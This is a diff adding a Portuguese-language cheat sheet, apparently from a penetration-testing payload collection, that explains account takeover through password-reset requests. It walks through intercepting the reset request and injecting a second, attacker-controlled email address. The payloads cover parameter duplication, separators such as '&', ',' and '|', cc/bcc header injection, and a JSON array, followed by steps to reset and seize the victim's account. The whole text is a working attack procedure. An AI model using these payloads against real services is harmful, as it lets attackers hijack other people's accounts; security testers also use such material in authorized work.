@@ -1,0 +1,52 @@
+UMA FORMA DE FAZER UM ACCOUNT TAKEOVER SERIA POR MEIO DE UMA REQUISIÇÃO DE ALTERAÇÃO DE SENHA,
+ONDE VOCÊ ENVIA A MESMA REQUISIÇÃO PARA DOIS EMAILS, FAZENDO COM QUE A ALTERAÇÃO DE SENHA DE UMA CONTA
+VÁ TAMBÉM PARA A CONTA DO ATACANTE, PROPORCIONANDO QUE ELE ALTERE A SENHA E TENHA ACESSO A CONTA.
+
+	1.ENTRE NA ALTERAÇÃO DE SENHA.
+	
+	2.INSIRA O EMAIL.
+	
+	3.INTERCEPTE A REQUISIÇÃO.
+	
+	4.TENTE FAZER BYPASS PARA O EMAIL DESSA CONTA SER ENVIADA PARA O SEU EMAIL TAMBÉM
+	
+		EXEMPLO DO BODY DE REQUISIÇÃO:
+				
+				email=victim@email.com
+				
+		TENTE ALTERAR USANDO UM '&' OU '%20' OU ',' OU '!0a!0dcc:' OU '!0a!0dbcc:' OU '|' PARA ADICIONAR MAIS UM EMAIL:
+			
+				email=victim@email.com&email=attacker@email.com
+				
+				email=victim@email.com%20email=attacker@email.com
+				
+				email=victim@email.com,email=attacker@email.com
+				
+				email=victim@email.com | email=attacker@email.com
+				
+				email="victim@email.com!0a!0dcc:attacker@email.com"
+				
+				email="victim@email.com!0a!0dbcc:attacker@email.com"
+				
+		OUTRA FORMA TAMBÉM SERIA QUANDO O BODY DA REQUISIÇÃO É:
+				
+				{ "email"="victim@email.com" }
+				
+		VOCÊ PODE TENTAR ALTERAR PARA:
+				
+				{ "email"=["victim@email.com", "attacker@email.com"] }
+				
+	5.TENTE UMA DAS FORMAS E ENVIE A REQUISIÇÃO.
+		
+	6.CASO O ENVIO DÊ CÓDIGO 200 É PORQUE O ENVIO FOI BEM SUCEDIDO.
+	
+	7.AGORA ENTRE EM SEU EMAIL E ACESSE O EMAIL RECEBIDO.
+	
+	8.ALTERE A SENHA.
+	
+	9.AGORA VOCÊ TERÁ ACESSO A CONTA USANDO A SENHA QUE ALTEROU.
+	
+	EXTRA: CASO NÃO DÊ CERTO COM A PRIMEIRA FORMA DE BYPASS, TENTE COM AS OUTRAS FORMAS.
+	
+	
+				
